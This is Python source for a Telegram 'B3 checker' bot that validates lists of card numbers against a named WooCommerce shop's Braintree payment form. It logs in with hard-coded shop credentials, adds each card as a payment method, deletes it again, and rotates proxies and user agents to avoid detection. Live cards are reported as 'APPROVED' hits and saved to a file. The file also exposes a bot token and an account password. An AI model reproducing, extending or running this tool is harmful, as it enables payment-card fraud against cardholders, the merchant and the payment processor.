"""
Woolroots B3 Checker v7 — Live UI Edition
Owner: @DarkCarder05
Token & Owner updated.
"""
import os, re, time, base64, random, uuid, threading, logging, itertools
from threading import Lock
import requests
from bs4 import BeautifulSoup
import telebot
from telebot import types

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("wool")

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
BOT_TOKEN   = "8031306974:AAGj-WcGWWeapvJO1VjQf6zp_cqNSjyiBHs"
OWNER_ID    = 7077294261
OWNER_TAG   = "@DarkCarder05"
BOT_NAME    = "TON B3 CHECKER"

SITE        = "https://www.woolroots.com"
LOGIN_URL   = SITE + "/my-account/"
ADD_PM_URL  = SITE + "/my-account/add-payment-method/"
AJAX_URL    = SITE + "/wp-admin/admin-ajax.php"
BT_GRAPHQL  = "https://payments.braintree-api.com/graphql"

LOGIN_USER  = "lagxd71@gmail.com"
LOGIN_PASS  = "90901212Aa@"

DELAY_MIN = 3
DELAY_MAX = 7
PROXY_MAX_RETRIES = 3

# ═══════════════════════════════════════════════════════════
# PROXIES
# ═══════════════════════════════════════════════════════════
PROXY_USER = ""
PROXY_PASS = ""

RAW_HOSTS = [
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
    "px051003.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780",
    "95.211.174.135:3128",
    "103.237.102.191:11111",
    "184.75.221.82:3118",
    "185.191.239.248:3128",
]

def _build_proxies():
    out = []
    for h in RAW_HOSTS:
        if PROXY_USER and PROXY_PASS:
            out.append("http://" + PROXY_USER + ":" + PROXY_PASS + "@" + h)
        else:
            out.append("http://" + h)
    return out

PROXIES = _build_proxies()
_proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None
_proxy_lock = Lock()

def next_proxy():
    if not _proxy_cycle:
        return None
    with _proxy_lock:
        return next(_proxy_cycle)

def proxy_dict(p):
    if not p:
        return None
    return {"http": p, "https": p}

def masked_proxy(p):
    if not p:
        return "DIRECT"
    if "@" in p:
        return p.split("@")[-1]
    return p.replace("http://", "").replace("https://", "")

# ═══════════════════════════════════════════════════════════
# UA ROTATION
# ═══════════════════════════════════════════════════════════
UAS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
]

def rand_ua():
    return random.choice(UAS)

# ═══════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════
STOP_FLAG = {"stop": False}
_BIN_CACHE = {}

def luhn_ok(number):
    try:
        digits = [int(d) for d in str(number) if d.isdigit()]
        if len(digits) < 12:
            return False
        s = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            s += d
        return s % 10 == 0
    except:
        return False

def parse_card(line):
    parts = re.split(r"[|/, ]+", line.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    cc = re.sub(r"\D", "", cc)
    if not (13 <= len(cc) <= 19):
        return None
    if not luhn_ok(cc):
        return None
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        return None
    if not (yy.isdigit() and len(yy) in (2, 4)):
        return None
    if not (cvv.isdigit() and len(cvv) in (3, 4)):
        return None
    mm = mm.zfill(2)
    if len(yy) == 4:
        yy = yy[2:]
    return cc, mm, yy, cvv

def bin_lookup(cc):
    b = cc[:6]
    if b in _BIN_CACHE:
        return _BIN_CACHE[b]
    try:
        r = requests.get(
            "https://lookup.binlist.net/" + b,
            headers={"Accept-Version": "3"},
            timeout=8
        ).json()
        info = (str(r.get('scheme', '-')) + " " + str(r.get('type', '-')) + " " + str(r.get('brand', '-'))).upper()
        bank = str(r.get('bank', {}).get('name', '-')).upper()
        country = str(r.get('country', {}).get('name', '-')) + " " + str(r.get('country', {}).get('emoji', ''))
        _BIN_CACHE[b] = (info, bank, country)
        return info, bank, country
    except:
        _BIN_CACHE[b] = ("UNKNOWN", "UNKNOWN", "UNKNOWN")
        return "UNKNOWN", "UNKNOWN", "UNKNOWN"

# ═══════════════════════════════════════════════════════════
# DELETE
# ═══════════════════════════════════════════════════════════
def extract_delete_link(html, base_url):
    try:
        soup = BeautifulSoup(html, "html.parser")
        for sel in ['a[href*="delete-payment-method"]', 'a[href*="delete"]']:
            el = soup.select_one(sel)
            if el and el.get("href"):
                href = el["href"]
                if href.startswith("http"):
                    return href
                return base_url.rstrip("/") + "/" + href.lstrip("/")
        m = re.search(r'href="([^"]*delete-payment-method[^"]*)"', html, re.I)
        if m:
            href = m.group(1).replace("&amp;", "&")
            if href.startswith("http"):
                return href
            return base_url.rstrip("/") + "/" + href.lstrip("/")
    except:
        pass
    return None

def delete_payment_method(session, delete_url):
    try:
        r = session.get(delete_url, timeout=25)
        if r.status_code != 200:
            return False, "GET " + str(r.status_code)
        m = re.search(r'name="_wpnonce" value="(.*?)"', r.text)
        if not m:
            m = re.search(r'name="woocommerce-delete-payment-method-nonce" value="(.*?)"', r.text)
        nonce = m.group(1) if m else None
        data = {"_wpnonce": nonce} if nonce else {}
        data["_wp_http_referer"] = "/my-account/add-payment-method/"
        soup = BeautifulSoup(r.text, "html.parser")
        for inp in soup.select("form input"):
            name = inp.get("name")
            val = inp.get("value", "")
            if name and name not in data:
                data[name] = val
        r2 = session.post(
            delete_url, data=data, timeout=25,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": delete_url}
        )
        low = r2.text.lower()
        if any(k in low for k in ["deleted", "removed", "payment method successfully", "no payment methods", "no saved"]):
            return True, "deleted"
        if "delete-payment-method" not in r2.text:
            return True, "deleted"
        return False, "unclear"
    except Exception as ex:
        return False, "EXC: " + str(ex)[:40]

def ensure_clean_slate(session):
    try:
        r = session.get(ADD_PM_URL, timeout=25)
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.select('a[href*="delete-payment-method"]'):
            href = a.get("href")
            if href:
                if not href.startswith("http"):
                    href = SITE.rstrip("/") + "/" + href.lstrip("/")
                delete_payment_method(session, href)
    except:
        pass

# ═══════════════════════════════════════════════════════════
# UI HELPERS
# ═══════════════════════════════════════════════════════════
def _edit_progress(chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
                   masked_card, stage_text, start, status_emoji):
    elapsed = time.time() - start
    speed = i / max(elapsed, 1)

    bar_len = 12
    filled = int(bar_len * i / total) if total else 0
    bar = "▰" * filled + "▱" * (bar_len - filled)
    pct = int(100 * i / total) if total else 0

    text = (
        "👑 <b>LIVE MASS CHECK</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>Progress:</b> <code>" + str(i) + "/" + str(total) + "</code>\n"
        "<code>" + bar + "</code> <b>" + str(pct) + "%</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💳 <b>Current CC:</b>\n"
        "<code>" + str(masked_card) + "</code>\n\n"
        + str(stage_text) + "\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📈 <b>Stats:</b>\n"
        "💎 <code>" + str(ok) + "</code>  "
        "❌ <code>" + str(bad) + "</code>  "
        "⚠️ <code>" + str(risk) + "</code>  "
        "💀 <code>" + str(err) + "</code>  "
        "🧹 <code>" + str(del_fail) + "</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⏱ <b>Time:</b> <code>" + str(int(elapsed)) + "s</code>  "
        "⚡ <b>Speed:</b> <code>" + str(round(speed, 2)) + "/s</code>\n"
        "🛡 <b>Proxy:</b> <code>rotating</code>"
    )

    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=text, parse_mode="HTML"
        )
    except Exception as ex:
        if "not modified" not in str(ex).lower():
            logger.warning("edit fail: " + str(ex)[:60])

# ═══════════════════════════════════════════════════════════
# CORE — with live logs
# ═══════════════════════════════════════════════════════════
def check_card_with_logs(line, chat_id, msg_id, i, total,
                         ok, bad, risk, err, del_fail, start):
    parsed = parse_card(line)
    if not parsed:
        return {
            "status": "error", "response": "INVALID_FORMAT", "card": line,
            "bin": "-", "bank": "-", "country": "-",
            "deleted": None, "delete_msg": "", "proxy": "-"
        }

    cc, mm, yy, cvv = parsed
    masked = cc[:6] + "******" + cc[-4:]

    last_result = None
    for attempt in range(1, PROXY_MAX_RETRIES + 1):
        proxy = next_proxy()
        r = _attempt_check_with_logs(
            parsed, proxy, chat_id, msg_id, i, total,
            ok, bad, risk, err, del_fail, start, masked
        )
        if r["status"] != "proxy_dead":
            return r
        last_result = r

        _edit_progress(
            chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
            masked,
            "🔁 <b>Stage:</b> ⚠️ Proxy dead — retry " + str(attempt) + "/" + str(PROXY_MAX_RETRIES),
            start, "🟡 Retrying"
        )
        time.sleep(1.5)

    last_result["status"] = "error"
    last_result["response"] = "ALL_PROXIES_FAILED"
    return last_result

def _attempt_check_with_logs(parsed, proxy, chat_id, msg_id, i, total,
                             ok, bad, risk, err, del_fail, start, masked):
    cc, mm, yy, cvv = parsed
    proxies = proxy_dict(proxy)
    ua = rand_ua()

    s = requests.Session()
    s.headers.update({"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9"})
    if proxies:
        s.proxies = proxies

    base = {
        "card": cc, "bin": "-", "bank": "-", "country": "-",
        "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
    }

    def log(stage):
        _edit_progress(
            chat_id, msg_id, i, total, ok, bad, risk, err, del_fail,
            masked, stage, start, "🟢 Running"
        )

    try:
        log("🔑 <b>Stage:</b> 🌐 Opening login page")
        r = s.get(LOGIN_URL, timeout=25)
        m = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', r.text)
        if not m:
            return _err("LOGIN_NONCE_FAIL", base)

        log("🔐 <b>Stage:</b> 🔓 Logging in...")
        r = s.post(
            LOGIN_URL,
            headers={"Content-Type": "application/x-www-form-urlencoded", "Referer": LOGIN_URL},
            data={
                "username": LOGIN_USER, "password": LOGIN_PASS,
                "woocommerce-login-nonce": m.group(1),
                "_wp_http_referer": "/my-account/", "login": "Log in"
            },
            timeout=25
        )
        if "logout" not in r.text.lower() and "/my-account" not in r.url:
            return _err("LOGIN_FAIL", base)

        log("🧹 <b>Stage:</b> 🗑 Cleaning old payment methods")
        ensure_clean_slate(s)

        log("📄 <b>Stage:</b> 📥 Loading payment page")
        r = s.get(ADD_PM_URL, headers={"Referer": LOGIN_URL}, timeout=25)
        m = re.search(r'"client_token_nonce":"(.*?)"', r.text)
        if not m:
            return _err("NO_CLIENT_NONCE", base)
        client_nonce = m.group(1)

        log("🔗 <b>Stage:</b> 🎫 Getting Braintree token")
        r = s.post(
            AJAX_URL,
            headers={
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": SITE, "Referer": ADD_PM_URL
            },
            data={"action": "wc_braintree_credit_card_get_client_token", "nonce": client_nonce},
            timeout=25
        )
        m = re.search(r'"data":"(.*?)"', r.text)
        if not m:
            return _err("NO_CLIENT_TOKEN", base)
        try:
            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
        except:
            return _err("TOKEN_DECODE_FAIL", base)
        m = re.search(r'"authorizationFingerprint":"(.*?)"', decoded)
        if not m:
            return _err("NO_AUTH_FP", base)
        auth_fp = m.group(1)

        log("💳 <b>Stage:</b> 🔍 Tokenizing card at Braintree")
        bt_headers = {
            "authority": "payments.braintree-api.com",
            "authorization": "Bearer " + auth_fp,
            "braintree-version": "2018-05-10",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
            "user-agent": ua,
        }
        payload = {
            "clientSdkMetadata": {
                "source": "client", "integration": "custom",
                "sessionId": str(uuid.uuid4())
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc, "expirationMonth": mm,
                        "expirationYear": yy, "cvv": cvv
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard",
        }
        r = requests.post(BT_GRAPHQL, headers=bt_headers, json=payload, proxies=proxies, timeout=30)
        try:
            j = r.json()
        except:
            return _err("BT_BAD_RESPONSE", base)

        if "errors" in j:
            err_str = str(j["errors"]).lower()
            if "cvv" in err_str or "security code" in err_str:
                log("❌ <b>Stage:</b> 🚫 CVV mismatch")
                return _ok("declined", "CVV_MISMATCH", cc, base)
            if "expired" in err_str or "expiration" in err_str:
                log("❌ <b>Stage:</b> 🚫 Expired card")
                return _ok("declined", "EXPIRED_CARD", cc, base)
            if "invalid" in err_str or "not a valid" in err_str or "invalid number" in err_str:
                log("❌ <b>Stage:</b> 🚫 Invalid card number")
                return _ok("declined", "INVALID_CARD", cc, base)
            log("❌ <b>Stage:</b> 🚫 " + err_str[:40])
            return _ok("declined", "BT: " + err_str[:60], cc, base)

        token = (j.get("data", {}).get("tokenizeCreditCard", {}) or {}).get("token")
        if not token:
            log("❌ <b>Stage:</b> 🚫 No token from Braintree")
            return _ok("declined", "NO_TOKEN_FROM_BT", cc, base)

        log("📤 <b>Stage:</b> 💾 Adding card to site")
        r = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
        m = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r.text)
        if not m:
            return _err("NO_ADD_NONCE", base)
        add_nonce = m.group(1)

        r = s.post(
            ADD_PM_URL,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": SITE, "Referer": ADD_PM_URL
            },
            data={
                "payment_method": "braintree_credit_card",
                "wc-braintree-credit-card-card-type": "visa",
                "wc-braintree-credit-card-3d-secure-enabled": "",
                "wc-braintree-credit-card-3d-secure-verified": "",
                "wc-braintree-credit-card-3d-secure-order-total": "0.00",
                "wc_braintree_credit_card_payment_nonce": token,
                "wc_braintree_device_data": '{"correlation_id":"' + uuid.uuid4().hex + '"}',
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": add_nonce,
                "_wp_http_referer": "/my-account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            },
            timeout=40
        )

        soup = BeautifulSoup(r.text, "html.parser")
        msg = ""
        try:
            el = soup.find("i", class_="nm-font nm-font-close")
            if el and el.parent:
                msg = el.parent.text.strip()
        except:
            pass
        if not msg:
            for sel in [".woocommerce-error li", ".woocommerce-message", ".woocommerce-info", "ul.woocommerce-error"]:
                el = soup.select_one(sel)
                if el:
                    msg = el.text.strip()
                    break
        low = (msg + " " + r.text[:1200]).lower()

        added = any(k in low for k in ["new payment method added", "payment method successfully added", "successfully added"])
        if added:
            log("✅ <b>Stage:</b> 💎 Card ADDED — cleaning up")
            r2 = s.get(ADD_PM_URL, headers={"Referer": ADD_PM_URL}, timeout=25)
            del_url = extract_delete_link(r2.text, SITE)
            deleted = None
            del_msg = ""
            if del_url:
                ok_del, del_msg = delete_payment_method(s, del_url)
                deleted = bool(ok_del)
            else:
                deleted = False
                del_msg = "no link"
            base["deleted"] = deleted
            base["delete_msg"] = del_msg
            return _ok("approved", msg or "CARD ADDED", cc, base)

        if "duplicate card exists" in low:
            log("❌ <b>Stage:</b> 🚫 Duplicate card")
            return _ok("declined", "DUPLICATE_CARD", cc, base)
        if "insufficient" in low or "not enough" in low:
            log("❌ <b>Stage:</b> 🚫 Insufficient funds")
            return _ok("declined", "INSUFFICIENT_FUNDS", cc, base)
        if "cvv" in low or "security code" in low:
            log("❌ <b>Stage:</b> 🚫 CVV mismatch")
            return _ok("declined", "CVV_MISMATCH", cc, base)
        if "gateway rejected" in low and "avs" in low:
            log("❌ <b>Stage:</b> 🚫 Gateway rejected (AVS)")
            return _ok("declined", "GATEWAY_REJECTED:AVS", cc, base)
        if "risk" in low or "fraud" in low:
            log("⚠️ <b>Stage:</b> 🛡 Risk flagged")
            return _ok("declined", msg[:100] or "RISK", cc, base)
        if any(k in low for k in ["declined", "invalid", "expired", "failed", "error"]):
            log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
            return _ok("declined", msg[:100] or "DECLINED", cc, base)
        log("❌ <b>Stage:</b> 🚫 " + (msg[:40] or "Declined"))
        return _ok("declined", msg[:100] or "DECLINED", cc, base)

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as pe:
        return {
            "status": "proxy_dead",
            "response": "PROXY_DEAD: " + str(pe)[:40],
            "card": cc, "bin": "-", "bank": "-", "country": "-",
            "deleted": None, "delete_msg": "", "proxy": masked_proxy(proxy)
        }
    except requests.exceptions.Timeout:
        log("💀 <b>Stage:</b> ⏱ Timeout")
        return _err("TIMEOUT", base)
    except Exception as ex:
        log("💀 <b>Stage:</b> " + str(ex)[:40])
        return _err("EXC: " + str(ex)[:60], base)
    finally:
        try:
            s.close()
        except:
            pass

def _ok(status, response, cc, base):
    info, bank, country = bin_lookup(cc)
    return {
        "status": status, "response": response, "card": cc,
        "bin": info, "bank": bank, "country": country,
        "deleted": base.get("deleted"), "delete_msg": base.get("delete_msg", ""),
        "proxy": base.get("proxy", "-")
    }

def _err(reason, base):
    info, bank, country = bin_lookup(base["card"])
    return {
        "status": "error", "response": reason, "card": base["card"],
        "bin": info, "bank": bank, "country": country,
        "deleted": None, "delete_msg": "",
        "proxy": base.get("proxy", "-")
    }

# ═══════════════════════════════════════════════════════════
# BOT
# ═══════════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    text = (
        "💎 <b>TON B3 CHECKER</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "👋 <b>Welcome " + (msg.from_user.first_name or "User") + "!</b>\n\n"
        "⚡ <b>Gateway:</b> Braintree\n"
        "📍 <b>Site:</b> <code>woolroots.com</code>\n"
        "🛡 <b>Proxies:</b> <code>" + str(len(PROXIES)) + "</code>\n"
        "🟢 <b>Status:</b> Online\n\n"
        "📖 <b>How to use:</b>\n"
        "1. Send <code>.txt</code> file with cards\n"
        "2. Reply to it with <code>/chk</code>\n"
        "3. Watch live stages 💎\n\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🤖 <b>Bot By " + OWNER_TAG + "</b>"
    )
    bot.reply_to(msg, text)

@bot.message_handler(commands=["stop"])
def cmd_stop(msg):
    STOP_FLAG["stop"] = True
    bot.reply_to(msg, "🛑 <b>Stopping...</b>")

@bot.message_handler(commands=["proxies"])
def cmd_proxies(msg):
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, "🚫 <b>Not authorized</b>")
        return
    lst = "\n".join("⚡ <code>" + masked_proxy(p) + "</code>" for p in PROXIES)
    bot.reply_to(msg, "🛡 <b>Proxies (" + str(len(PROXIES)) + "):</b>\n\n" + lst)

@bot.message_handler(commands=["chk"])
def cmd_chk(msg):
    replied = msg.reply_to_message
    if not replied or not replied.document:
        bot.reply_to(msg, "📍 Reply <code>/chk</code> to a .txt file")
        return
    if msg.from_user.id != OWNER_ID:
        bot.reply_to(msg, "🚫 Not authorized")
        return
    doc = replied.document
    if not doc.file_name.endswith(".txt"):
        bot.reply_to(msg, "🚫 Only .txt files")
        return
    try:
        file_info = bot.get_file(doc.file_id)
        content = bot.download_file(file_info.file_path).decode("utf-8", errors="ignore")
    except Exception as ex:
        bot.reply_to(msg, "⚠️ Download failed: " + str(ex))
        return
    lines = [l.strip() for l in content.splitlines() if l.strip() and not l.startswith("#")]
    parsed = [l for l in lines if parse_card(l)]
    if not parsed:
        bot.reply_to(msg, "❌ No valid cards")
        return
    STOP_FLAG["stop"] = False
    start_text = (
        "❤️‍🔥 <b>STARTING CHECK</b>\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "📍 File: <code>" + str(doc.file_name) + "</code>\n"
        "💵 Cards: <code>" + str(len(parsed)) + "</code>\n"
        "🛡 Proxies: <code>" + str(len(PROXIES)) + "</code>\n\n"
        "<i>Live stage logs will appear below 🔄</i>"
    )
    bot.reply_to(msg, start_text)
    threading.Thread(target=run_check, args=(msg.chat.id, parsed), daemon=True).start()

def run_check(chat_id, cards):
    total = len(cards)
    ok = bad = risk = err = 0
    delete_fail = 0
    start = time.time()

    header = (
        "👑 <b>LIVE MASS CHECK</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💳 <b>Total:</b> <code>" + str(total) + "</code>\n"
        "🛡 <b>Proxies:</b> <code>" + str(len(PROXIES)) + "</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔄 <b>Starting...</b>"
    )
    status_msg = bot.send_message(chat_id, header)
    msg_id = status_msg.message_id

    for i, card in enumerate(cards, 1):
        if STOP_FLAG["stop"]:
            try:
                bot.edit_message_text(
                    chat_id=chat_id, message_id=msg_id,
                    text="🚫 <b>Stopped at " + str(i-1) + "/" + str(total) + "</b>",
                    parse_mode="HTML"
                )
            except:
                pass
            break

        parsed = parse_card(card)
        masked = "invalid"
        if parsed:
            cc = parsed[0]
            masked = cc[:6] + "******" + cc[-4:]

        _edit_progress(
            chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
            masked, "⚡ <b>Stage:</b> 🚀 Initializing...",
            start, "🟡 Starting"
        )

        try:
            r = check_card_with_logs(card, chat_id, msg_id, i, total,
                                     ok, bad, risk, err, delete_fail, start)
        except Exception as ex:
            r = {
                "status": "error", "response": "EXC: " + str(ex), "card": card,
                "bin": "-", "bank": "-", "country": "-",
                "deleted": None, "delete_msg": "", "proxy": "-"
            }

        if r["status"] == "approved":
            ok += 1
            if r.get("deleted") is False:
                delete_fail += 1
            _send_hit(chat_id, r)
        elif r["status"] == "risk":
            risk += 1
        elif r["status"] == "declined":
            bad += 1
        else:
            err += 1

        if r["status"] == "approved":
            final_stage = "💎 <b>Stage:</b> ✅ ADDED & DELETED"
        elif r["status"] == "declined":
            final_stage = "❌ <b>Stage:</b> 🚫 " + str(r["response"])[:40]
        elif r["status"] == "risk":
            final_stage = "⚠️ <b>Stage:</b> 🛡 Risk flagged"
        else:
            final_stage = "💀 <b>Stage:</b> " + str(r["response"])[:40]

        _edit_progress(
            chat_id, msg_id, i, total, ok, bad, risk, err, delete_fail,
            masked, final_stage, start, "🟢 Done"
        )

        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

    elapsed = time.time() - start
    summary = (
        "👑 <b>CHECK FINISHED</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 <b>Total:</b> <code>" + str(total) + "</code>\n"
        "💎 <b>Approved:</b> <code>" + str(ok) + "</code>\n"
        "❌ <b>Declined:</b> <code>" + str(bad) + "</code>\n"
        "⚠️ <b>Risk:</b> <code>" + str(risk) + "</code>\n"
        "💀 <b>Error:</b> <code>" + str(err) + "</code>\n"
        "🧹 <b>Delete fail:</b> <code>" + str(delete_fail) + "</code>\n\n"
        "⏱ <b>Time:</b> <code>" + str(int(elapsed)) + "s</code>\n"
        "⚡ <b>Speed:</b> <code>" + str(round(total/max(elapsed,1), 2)) + " cards/s</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 <b>" + OWNER_TAG + "</b>"
    )
    try:
        bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=summary, parse_mode="HTML"
        )
    except:
        bot.send_message(chat_id, summary, parse_mode="HTML")

def _send_hit(chat_id, r):
    del_line = ""
    if r.get("deleted") is True:
        del_line = "┃ 🧹 Deleted: ✅\n"
    elif r.get("deleted") is False:
        del_line = "┃ 🧹 Deleted: ❌\n"

    text = (
        "❤️‍🔥 <b>APPROVED</b> ❤️‍🔥\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "┏━━━━━━━━━━━━━━━━┓\n"
        "┃ 💵 <b>CC:</b> <code>" + str(r['card']) + "</code>\n"
        "┃ 📍 <b>Resp:</b> <b>" + str(r['response']) + "</b>\n"
        "┃ ⚡ <b>Gateway:</b> Braintree\n"
        "┃ 🛡 <b>Proxy:</b> <code>" + str(r.get('proxy', '-')) + "</code>\n"
        + del_line +
        "┗━━━━━━━━━━━━━━━━┛\n\n"
        "🏦 BIN: <code>" + str(r['bin']) + "</code>\n"
        "🏛 Bank: <code>" + str(r['bank']) + "</code>\n"
        "🌍 Country: <code>" + str(r['country']) + "</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🤖 <b>" + OWNER_TAG + "</b>"
    )
    try:
        bot.send_message(chat_id, text, parse_mode="HTML")
    except Exception as ex:
        logger.warning("hit send fail: " + str(ex))
    try:
        with open("hits_woolroots.txt", "a") as f:
            f.write(str(r['card']) + " | " + str(r['response']) + " | " + str(r['bin']) + " | " + str(r['bank']) + " | del=" + str(r.get('deleted')) + "\n")
    except:
        pass

# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("🚀 " + BOT_NAME + " starting...")
    print("🛡 Proxies: " + str(len(PROXIES)))
    bot.infinity_polling(timeout=30, long_polling_timeout=30)
